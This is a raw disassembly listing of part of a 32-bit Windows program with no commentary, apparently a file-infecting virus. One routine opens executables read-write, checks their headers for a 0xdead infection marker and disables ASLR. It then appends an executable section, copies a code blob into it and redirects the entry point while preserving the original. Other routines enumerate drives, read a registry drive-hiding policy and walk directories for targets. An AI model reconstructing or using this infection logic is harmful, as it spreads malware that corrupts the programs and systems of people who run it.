  402488:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40248b:	8b 51 38             	mov    0x38(%ecx),%edx
  40248e:	83 ea 01             	sub    $0x1,%edx
  402491:	f7 d2                	not    %edx
  402493:	23 55 10             	and    0x10(%ebp),%edx
  402496:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402499:	03 50 38             	add    0x38(%eax),%edx
  40249c:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40249f:	eb 06                	jmp    0x4024a7
  4024a1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4024a4:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4024a7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4024aa:	6b d2 28             	imul   $0x28,%edx,%edx
  4024ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4024b0:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4024b3:	89 4c 10 10          	mov    %ecx,0x10(%eax,%edx,1)
  4024b7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4024ba:	6b d2 28             	imul   $0x28,%edx,%edx
  4024bd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4024c0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4024c3:	89 4c 10 08          	mov    %ecx,0x8(%eax,%edx,1)
  4024c7:	6a 08                	push   $0x8
  4024c9:	8b 55 0c             	mov    0xc(%ebp),%edx
  4024cc:	52                   	push   %edx
  4024cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4024d0:	6b c0 28             	imul   $0x28,%eax,%eax
  4024d3:	03 45 f8             	add    -0x8(%ebp),%eax
  4024d6:	50                   	push   %eax
  4024d7:	e8 c2 0c 00 00       	call   0x40319e
  4024dc:	83 c4 0c             	add    $0xc,%esp
  4024df:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4024e2:	66 8b 51 06          	mov    0x6(%ecx),%dx
  4024e6:	66 83 c2 01          	add    $0x1,%dx
  4024ea:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024ed:	66 89 50 06          	mov    %dx,0x6(%eax)
  4024f1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4024f4:	6b c9 28             	imul   $0x28,%ecx,%ecx
  4024f7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4024fa:	6b d2 28             	imul   $0x28,%edx,%edx
  4024fd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402500:	8b 4c 08 0c          	mov    0xc(%eax,%ecx,1),%ecx
  402504:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402507:	03 4c 10 08          	add    0x8(%eax,%edx,1),%ecx
  40250b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40250e:	89 4a 50             	mov    %ecx,0x50(%edx)
  402511:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402514:	c7 40 58 00 00 00 00 	movl   $0x0,0x58(%eax)
  40251b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40251e:	6b c0 28             	imul   $0x28,%eax,%eax
  402521:	03 45 f8             	add    -0x8(%ebp),%eax
  402524:	8b e5                	mov    %ebp,%esp
  402526:	5d                   	pop    %ebp
  402527:	c2 10 00             	ret    $0x10
  40252a:	cc                   	int3
  40252b:	cc                   	int3
  40252c:	cc                   	int3
  40252d:	cc                   	int3
  40252e:	cc                   	int3
  40252f:	cc                   	int3
  402530:	55                   	push   %ebp
  402531:	8b ec                	mov    %esp,%ebp
  402533:	83 ec 38             	sub    $0x38,%esp
  402536:	6a 00                	push   $0x0
  402538:	68 80 00 00 00       	push   $0x80
  40253d:	6a 03                	push   $0x3
  40253f:	6a 00                	push   $0x0
  402541:	6a 03                	push   $0x3
  402543:	68 00 00 00 c0       	push   $0xc0000000
  402548:	8b 45 08             	mov    0x8(%ebp),%eax
  40254b:	50                   	push   %eax
  40254c:	ff 15 64 40 40 00    	call   *0x404064
  402552:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402555:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  402559:	75 07                	jne    0x402562
  40255b:	32 c0                	xor    %al,%al
  40255d:	e9 c6 02 00 00       	jmp    0x402828
  402562:	6a 00                	push   $0x0
  402564:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402567:	51                   	push   %ecx
  402568:	ff 15 68 40 40 00    	call   *0x404068
  40256e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402571:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402575:	75 07                	jne    0x40257e
  402577:	32 c0                	xor    %al,%al
  402579:	e9 aa 02 00 00       	jmp    0x402828
  40257e:	ba f0 1e 40 00       	mov    $0x401ef0,%edx
  402583:	81 ea f0 10 40 00    	sub    $0x4010f0,%edx
  402589:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40258c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40258f:	25 ff 0f 00 00       	and    $0xfff,%eax
  402594:	74 14                	je     0x4025aa
  402596:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402599:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  40259f:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  4025a5:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4025a8:	eb 06                	jmp    0x4025b0
  4025aa:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4025ad:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4025b0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4025b3:	03 45 c8             	add    -0x38(%ebp),%eax
  4025b6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4025b9:	6a 00                	push   $0x0
  4025bb:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4025be:	51                   	push   %ecx
  4025bf:	6a 00                	push   $0x0
  4025c1:	6a 04                	push   $0x4
  4025c3:	6a 00                	push   $0x0
  4025c5:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4025c8:	52                   	push   %edx
  4025c9:	ff 15 6c 40 40 00    	call   *0x40406c
  4025cf:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4025d2:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  4025d6:	75 11                	jne    0x4025e9
  4025d8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4025db:	50                   	push   %eax
  4025dc:	ff 15 70 40 40 00    	call   *0x404070
  4025e2:	32 c0                	xor    %al,%al
  4025e4:	e9 3f 02 00 00       	jmp    0x402828
  4025e9:	6a 00                	push   $0x0
  4025eb:	6a 00                	push   $0x0
  4025ed:	6a 00                	push   $0x0
  4025ef:	68 1f 00 0f 00       	push   $0xf001f
  4025f4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4025f7:	51                   	push   %ecx
  4025f8:	ff 15 74 40 40 00    	call   *0x404074
  4025fe:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402601:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402605:	75 1b                	jne    0x402622
  402607:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40260a:	52                   	push   %edx
  40260b:	ff 15 70 40 40 00    	call   *0x404070
  402611:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402614:	50                   	push   %eax
  402615:	ff 15 70 40 40 00    	call   *0x404070
  40261b:	32 c0                	xor    %al,%al
  40261d:	e9 06 02 00 00       	jmp    0x402828
  402622:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402625:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402628:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40262b:	0f b7 02             	movzwl (%edx),%eax
  40262e:	3d 4d 5a 00 00       	cmp    $0x5a4d,%eax
  402633:	74 10                	je     0x402645
  402635:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402638:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40263b:	e9 a0 01 00 00       	jmp    0x4027e0
  402640:	e9 9b 01 00 00       	jmp    0x4027e0
  402645:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402648:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40264b:	03 42 3c             	add    0x3c(%edx),%eax
  40264e:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402651:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402654:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  40265a:	74 10                	je     0x40266c
  40265c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40265f:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402662:	e9 79 01 00 00       	jmp    0x4027e0
  402667:	e9 74 01 00 00       	jmp    0x4027e0
  40266c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40266f:	0f b7 48 04          	movzwl 0x4(%eax),%ecx
  402673:	81 f9 64 86 00 00    	cmp    $0x8664,%ecx
  402679:	75 2b                	jne    0x4026a6
  40267b:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40267e:	0f b7 42 18          	movzwl 0x18(%edx),%eax
  402682:	3d 0b 02 00 00       	cmp    $0x20b,%eax
  402687:	75 1d                	jne    0x4026a6
  402689:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40268c:	51                   	push   %ecx
  40268d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402690:	52                   	push   %edx
  402691:	e8 ca fa ff ff       	call   0x402160
  402696:	83 c4 08             	add    $0x8,%esp
  402699:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40269c:	e9 3f 01 00 00       	jmp    0x4027e0
  4026a1:	e9 3a 01 00 00       	jmp    0x4027e0
  4026a6:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4026a9:	0f b7 48 04          	movzwl 0x4(%eax),%ecx
  4026ad:	81 f9 4c 01 00 00    	cmp    $0x14c,%ecx
  4026b3:	75 0e                	jne    0x4026c3
  4026b5:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4026b8:	0f b7 42 18          	movzwl 0x18(%edx),%eax
  4026bc:	3d 0b 01 00 00       	cmp    $0x10b,%eax
  4026c1:	74 10                	je     0x4026d3
  4026c3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4026c6:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4026c9:	e9 12 01 00 00       	jmp    0x4027e0
  4026ce:	e9 0d 01 00 00       	jmp    0x4027e0
  4026d3:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4026d6:	81 7a 08 ad de 00 00 	cmpl   $0xdead,0x8(%edx)
  4026dd:	75 10                	jne    0x4026ef
  4026df:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4026e2:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4026e5:	e9 f6 00 00 00       	jmp    0x4027e0
  4026ea:	e9 f1 00 00 00       	jmp    0x4027e0
  4026ef:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4026f2:	0f b7 51 5e          	movzwl 0x5e(%ecx),%edx
  4026f6:	83 e2 bf             	and    $0xffffffbf,%edx
  4026f9:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4026fc:	66 89 50 5e          	mov    %dx,0x5e(%eax)
  402700:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402703:	8b 51 3c             	mov    0x3c(%ecx),%edx
  402706:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402709:	8d 8c 10 f8 00 00 00 	lea    0xf8(%eax,%edx,1),%ecx
  402710:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402713:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402716:	89 55 d8             	mov    %edx,-0x28(%ebp)
  402719:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40271c:	0f b7 48 06          	movzwl 0x6(%eax),%ecx
  402720:	6b c9 28             	imul   $0x28,%ecx,%ecx
  402723:	81 c1 38 01 00 00    	add    $0x138,%ecx
  402729:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40272c:	3b 4a 54             	cmp    0x54(%edx),%ecx
  40272f:	72 10                	jb     0x402741
  402731:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402734:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402737:	e9 a4 00 00 00       	jmp    0x4027e0
  40273c:	e9 9f 00 00 00       	jmp    0x4027e0
  402741:	68 00 00 00 60       	push   $0x60000000
  402746:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402749:	51                   	push   %ecx
  40274a:	68 88 52 40 00       	push   $0x405288
  40274f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402752:	52                   	push   %edx
  402753:	e8 78 fb ff ff       	call   0x4022d0
  402758:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40275b:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40275f:	75 0a                	jne    0x40276b
  402761:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402764:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402767:	eb 77                	jmp    0x4027e0
  402769:	eb 75                	jmp    0x4027e0
  40276b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40276e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402771:	03 51 14             	add    0x14(%ecx),%edx
  402774:	89 55 d0             	mov    %edx,-0x30(%ebp)
  402777:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40277a:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40277d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402780:	51                   	push   %ecx
  402781:	68 f0 10 40 00       	push   $0x4010f0
  402786:	8b 55 d0             	mov    -0x30(%ebp),%edx
  402789:	52                   	push   %edx
  40278a:	e8 0f 0a 00 00       	call   0x40319e
  40278f:	83 c4 0c             	add    $0xc,%esp
  402792:	b8 01 00 00 00       	mov    $0x1,%eax
  402797:	85 c0                	test   %eax,%eax
  402799:	74 23                	je     0x4027be
  40279b:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40279e:	81 39 cc cc cc cc    	cmpl   $0xcccccccc,(%ecx)
  4027a4:	75 0d                	jne    0x4027b3
  4027a6:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4027a9:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4027ac:	8b 48 28             	mov    0x28(%eax),%ecx
  4027af:	89 0a                	mov    %ecx,(%edx)
  4027b1:	eb 0b                	jmp    0x4027be
  4027b3:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4027b6:	83 c2 01             	add    $0x1,%edx
  4027b9:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4027bc:	eb d4                	jmp    0x402792
  4027be:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4027c1:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4027c4:	2b 48 14             	sub    0x14(%eax),%ecx
  4027c7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4027ca:	03 4a 0c             	add    0xc(%edx),%ecx
  4027cd:	2b 4d f8             	sub    -0x8(%ebp),%ecx
  4027d0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4027d3:	89 48 28             	mov    %ecx,0x28(%eax)
  4027d6:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4027d9:	c7 41 08 ad de 00 00 	movl   $0xdead,0x8(%ecx)
  4027e0:	6a 00                	push   $0x0
  4027e2:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4027e5:	52                   	push   %edx
  4027e6:	ff 15 78 40 40 00    	call   *0x404078
  4027ec:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4027ef:	50                   	push   %eax
  4027f0:	ff 15 7c 40 40 00    	call   *0x40407c
  4027f6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4027f9:	51                   	push   %ecx
  4027fa:	ff 15 70 40 40 00    	call   *0x404070
  402800:	6a 00                	push   $0x0
  402802:	6a 00                	push   $0x0
  402804:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402807:	52                   	push   %edx
  402808:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40280b:	50                   	push   %eax
  40280c:	ff 15 80 40 40 00    	call   *0x404080
  402812:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  402815:	51                   	push   %ecx
  402816:	ff 15 84 40 40 00    	call   *0x404084
  40281c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40281f:	52                   	push   %edx
  402820:	ff 15 70 40 40 00    	call   *0x404070
  402826:	b0 01                	mov    $0x1,%al
  402828:	8b e5                	mov    %ebp,%esp
  40282a:	5d                   	pop    %ebp
  40282b:	c3                   	ret
  40282c:	cc                   	int3
  40282d:	cc                   	int3
  40282e:	cc                   	int3
  40282f:	cc                   	int3
  402830:	55                   	push   %ebp
  402831:	8b ec                	mov    %esp,%ebp
  402833:	81 ec 0c 02 00 00    	sub    $0x20c,%esp
  402839:	68 04 01 00 00       	push   $0x104
  40283e:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  402844:	50                   	push   %eax
  402845:	68 0c 53 40 00       	push   $0x40530c
  40284a:	ff 15 9c 40 40 00    	call   *0x40409c
  402850:	85 c0                	test   %eax,%eax
  402852:	75 04                	jne    0x402858
  402854:	32 c0                	xor    %al,%al
  402856:	eb 6a                	jmp    0x4028c2
  402858:	68 20 53 40 00       	push   $0x405320
  40285d:	8d 8d f8 fd ff ff    	lea    -0x208(%ebp),%ecx
  402863:	51                   	push   %ecx
  402864:	8d 95 f8 fd ff ff    	lea    -0x208(%ebp),%edx
  40286a:	52                   	push   %edx
  40286b:	ff 15 40 41 40 00    	call   *0x404140
  402871:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  402877:	50                   	push   %eax
  402878:	ff 15 48 41 40 00    	call   *0x404148
  40287e:	85 c0                	test   %eax,%eax
  402880:	74 06                	je     0x402888
  402882:	32 c0                	xor    %al,%al
  402884:	eb 3c                	jmp    0x4028c2
  402886:	eb 3a                	jmp    0x4028c2
  402888:	6a 00                	push   $0x0
  40288a:	6a 02                	push   $0x2
  40288c:	6a 01                	push   $0x1
  40288e:	6a 00                	push   $0x0
  402890:	6a 00                	push   $0x0
  402892:	68 00 00 00 40       	push   $0x40000000
  402897:	8d 8d f8 fd ff ff    	lea    -0x208(%ebp),%ecx
  40289d:	51                   	push   %ecx
  40289e:	ff 15 64 40 40 00    	call   *0x404064
  4028a4:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  4028aa:	83 bd f4 fd ff ff ff 	cmpl   $0xffffffff,-0x20c(%ebp)
  4028b1:	74 0d                	je     0x4028c0
  4028b3:	8b 95 f4 fd ff ff    	mov    -0x20c(%ebp),%edx
  4028b9:	52                   	push   %edx
  4028ba:	ff 15 70 40 40 00    	call   *0x404070
  4028c0:	b0 01                	mov    $0x1,%al
  4028c2:	8b e5                	mov    %ebp,%esp
  4028c4:	5d                   	pop    %ebp
  4028c5:	c3                   	ret
  4028c6:	cc                   	int3
  4028c7:	cc                   	int3
  4028c8:	cc                   	int3
  4028c9:	cc                   	int3
  4028ca:	cc                   	int3
  4028cb:	cc                   	int3
  4028cc:	cc                   	int3
  4028cd:	cc                   	int3
  4028ce:	cc                   	int3
  4028cf:	cc                   	int3
  4028d0:	55                   	push   %ebp
  4028d1:	8b ec                	mov    %esp,%ebp
  4028d3:	83 ec 0c             	sub    $0xc,%esp
  4028d6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4028dd:	b8 01 00 00 00       	mov    $0x1,%eax
  4028e2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4028e5:	d3 e0                	shl    %cl,%eax
  4028e7:	23 45 08             	and    0x8(%ebp),%eax
  4028ea:	74 3c                	je     0x402928
  4028ec:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4028ef:	83 c1 41             	add    $0x41,%ecx
  4028f2:	66 89 4d f4          	mov    %cx,-0xc(%ebp)
  4028f6:	ba 3a 00 00 00       	mov    $0x3a,%edx
  4028fb:	66 89 55 f6          	mov    %dx,-0xa(%ebp)
  4028ff:	33 c0                	xor    %eax,%eax
  402901:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
  402905:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  402908:	51                   	push   %ecx
  402909:	e8 22 00 00 00       	call   0x402930
  40290e:	83 c4 04             	add    $0x4,%esp
  402911:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402914:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402918:	74 0e                	je     0x402928
  40291a:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40291d:	52                   	push   %edx
  40291e:	8b 45 10             	mov    0x10(%ebp),%eax
  402921:	50                   	push   %eax
  402922:	ff 15 60 40 40 00    	call   *0x404060
  402928:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40292b:	8b e5                	mov    %ebp,%esp
  40292d:	5d                   	pop    %ebp
  40292e:	c3                   	ret
  40292f:	cc                   	int3
  402930:	55                   	push   %ebp
  402931:	8b ec                	mov    %esp,%ebp
  402933:	81 ec 1c 04 00 00    	sub    $0x41c,%esp
  402939:	8b 45 08             	mov    0x8(%ebp),%eax
  40293c:	50                   	push   %eax
  40293d:	ff 15 58 40 40 00    	call   *0x404058
  402943:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402946:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402949:	89 8d e4 fb ff ff    	mov    %ecx,-0x41c(%ebp)
  40294f:	83 bd e4 fb ff ff 02 	cmpl   $0x2,-0x41c(%ebp)
  402956:	72 4f                	jb     0x4029a7
  402958:	83 bd e4 fb ff ff 03 	cmpl   $0x3,-0x41c(%ebp)
  40295f:	76 0b                	jbe    0x40296c
  402961:	83 bd e4 fb ff ff 06 	cmpl   $0x6,-0x41c(%ebp)
  402968:	74 02                	je     0x40296c
  40296a:	eb 3b                	jmp    0x4029a7
  40296c:	68 08 02 00 00       	push   $0x208
  402971:	8d 95 e8 fb ff ff    	lea    -0x418(%ebp),%edx
  402977:	52                   	push   %edx
  402978:	8b 45 08             	mov    0x8(%ebp),%eax
  40297b:	50                   	push   %eax
  40297c:	ff 15 5c 40 40 00    	call   *0x40405c
  402982:	85 c0                	test   %eax,%eax
  402984:	74 21                	je     0x4029a7
  402986:	6a 04                	push   $0x4
  402988:	68 38 53 40 00       	push   $0x405338
  40298d:	8d 8d e8 fb ff ff    	lea    -0x418(%ebp),%ecx
  402993:	51                   	push   %ecx
  402994:	e8 0b 08 00 00       	call   0x4031a4
  402999:	83 c4 0c             	add    $0xc,%esp
  40299c:	85 c0                	test   %eax,%eax
  40299e:	75 07                	jne    0x4029a7
  4029a0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4029a7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4029aa:	8b e5                	mov    %ebp,%esp
  4029ac:	5d                   	pop    %ebp
  4029ad:	c3                   	ret
  4029ae:	cc                   	int3
  4029af:	cc                   	int3
  4029b0:	55                   	push   %ebp
  4029b1:	8b ec                	mov    %esp,%ebp
  4029b3:	83 ec 20             	sub    $0x20,%esp
  4029b6:	ff 15 54 40 40 00    	call   *0x404054
  4029bc:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4029bf:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4029c6:	c7 45 f8 02 00 00 80 	movl   $0x80000002,-0x8(%ebp)
  4029cd:	c7 45 fc 01 00 00 80 	movl   $0x80000001,-0x4(%ebp)
  4029d4:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4029db:	eb 09                	jmp    0x4029e6
  4029dd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4029e0:	83 c0 01             	add    $0x1,%eax
  4029e3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4029e6:	83 7d ec 02          	cmpl   $0x2,-0x14(%ebp)
  4029ea:	73 6a                	jae    0x402a56
  4029ec:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4029ef:	51                   	push   %ecx
  4029f0:	68 19 00 02 00       	push   $0x20019
  4029f5:	6a 00                	push   $0x0
  4029f7:	68 48 53 40 00       	push   $0x405348
  4029fc:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4029ff:	8b 44 95 f8          	mov    -0x8(%ebp,%edx,4),%eax
  402a03:	50                   	push   %eax
  402a04:	ff 15 00 40 40 00    	call   *0x404000
  402a0a:	85 c0                	test   %eax,%eax
  402a0c:	75 46                	jne    0x402a54
  402a0e:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  402a15:	c7 45 e0 04 00 00 00 	movl   $0x4,-0x20(%ebp)
  402a1c:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  402a1f:	51                   	push   %ecx
  402a20:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  402a23:	52                   	push   %edx
  402a24:	6a 00                	push   $0x0
  402a26:	6a 00                	push   $0x0
  402a28:	68 c0 53 40 00       	push   $0x4053c0
  402a2d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402a30:	50                   	push   %eax
  402a31:	ff 15 04 40 40 00    	call   *0x404004
  402a37:	85 c0                	test   %eax,%eax
  402a39:	75 0f                	jne    0x402a4a
  402a3b:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402a3f:	74 09                	je     0x402a4a
  402a41:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402a44:	0b 4d e4             	or     -0x1c(%ebp),%ecx
  402a47:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402a4a:	8b 55 e8             	mov    -0x18(%ebp),%edx
  402a4d:	52                   	push   %edx
  402a4e:	ff 15 08 40 40 00    	call   *0x404008
  402a54:	eb 87                	jmp    0x4029dd
  402a56:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402a59:	f7 d0                	not    %eax
  402a5b:	23 45 f0             	and    -0x10(%ebp),%eax
  402a5e:	8b e5                	mov    %ebp,%esp
  402a60:	5d                   	pop    %ebp
  402a61:	c3                   	ret
  402a62:	cc                   	int3
  402a63:	cc                   	int3
  402a64:	cc                   	int3
  402a65:	cc                   	int3
  402a66:	cc                   	int3
  402a67:	cc                   	int3
  402a68:	cc                   	int3
  402a69:	cc                   	int3
  402a6a:	cc                   	int3
  402a6b:	cc                   	int3
  402a6c:	cc                   	int3
  402a6d:	cc                   	int3
  402a6e:	cc                   	int3
  402a6f:	cc                   	int3
  402a70:	55                   	push   %ebp
  402a71:	8b ec                	mov    %esp,%ebp
  402a73:	81 ec dc 0a 00 00    	sub    $0xadc,%esp
  402a79:	c7 45 a8 d4 53 40 00 	movl   $0x4053d4,-0x58(%ebp)
  402a80:	c7 45 ac e4 53 40 00 	movl   $0x4053e4,-0x54(%ebp)
  402a87:	c7 45 b0 f4 53 40 00 	movl   $0x4053f4,-0x50(%ebp)
  402a8e:	c7 45 b4 00 54 40 00 	movl   $0x405400,-0x4c(%ebp)
  402a95:	c7 45 b8 0c 54 40 00 	movl   $0x40540c,-0x48(%ebp)
  402a9c:	c7 45 bc 20 54 40 00 	movl   $0x405420,-0x44(%ebp)
  402aa3:	c7 45 c0 30 54 40 00 	movl   $0x405430,-0x40(%ebp)
  402aaa:	c7 45 c4 48 54 40 00 	movl   $0x405448,-0x3c(%ebp)
  402ab1:	c7 45 c8 64 54 40 00 	movl   $0x405464,-0x38(%ebp)
  402ab8:	c7 45 cc 74 54 40 00 	movl   $0x405474,-0x34(%ebp)
  402abf:	c7 45 d0 98 54 40 00 	movl   $0x405498,-0x30(%ebp)
  402ac6:	c7 45 d4 a4 54 40 00 	movl   $0x4054a4,-0x2c(%ebp)
  402acd:	c7 45 d8 b4 54 40 00 	movl   $0x4054b4,-0x28(%ebp)
  402ad4:	c7 45 dc c4 54 40 00 	movl   $0x4054c4,-0x24(%ebp)
  402adb:	c7 45 e0 d8 54 40 00 	movl   $0x4054d8,-0x20(%ebp)
  402ae2:	c7 45 e4 ec 54 40 00 	movl   $0x4054ec,-0x1c(%ebp)
  402ae9:	c7 45 e8 fc 54 40 00 	movl   $0x4054fc,-0x18(%ebp)
  402af0:	c7 45 ec 10 55 40 00 	movl   $0x405510,-0x14(%ebp)
  402af7:	c7 45 f0 20 55 40 00 	movl   $0x405520,-0x10(%ebp)
  402afe:	c7 45 f4 30 55 40 00 	movl   $0x405530,-0xc(%ebp)
  402b05:	c7 45 f8 44 55 40 00 	movl   $0x405544,-0x8(%ebp)
  402b0c:	68 50 02 00 00       	push   $0x250
  402b11:	6a 00                	push   $0x0
  402b13:	8d 85 48 fb ff ff    	lea    -0x4b8(%ebp),%eax
  402b19:	50                   	push   %eax
  402b1a:	e8 91 06 00 00       	call   0x4031b0
  402b1f:	83 c4 0c             	add    $0xc,%esp
  402b22:	68 08 02 00 00       	push   $0x208
  402b27:	6a 00                	push   $0x0
  402b29:	8d 8d a0 fd ff ff    	lea    -0x260(%ebp),%ecx
  402b2f:	51                   	push   %ecx
  402b30:	e8 7b 06 00 00       	call   0x4031b0
  402b35:	83 c4 0c             	add    $0xc,%esp
  402b38:	68 50 55 40 00       	push   $0x405550
  402b3d:	8b 55 08             	mov    0x8(%ebp),%edx
  402b40:	52                   	push   %edx
  402b41:	8d 85 a0 fd ff ff    	lea    -0x260(%ebp),%eax
  402b47:	50                   	push   %eax
  402b48:	ff 15 40 41 40 00    	call   *0x404140
  402b4e:	8d 8d 48 fb ff ff    	lea    -0x4b8(%ebp),%ecx
  402b54:	51                   	push   %ecx
  402b55:	8d 95 a0 fd ff ff    	lea    -0x260(%ebp),%edx
  402b5b:	52                   	push   %edx
  402b5c:	ff 15 48 40 40 00    	call   *0x404048
  402b62:	89 85 9c fd ff ff    	mov    %eax,-0x264(%ebp)
  402b68:	83 bd 9c fd ff ff ff 	cmpl   $0xffffffff,-0x264(%ebp)
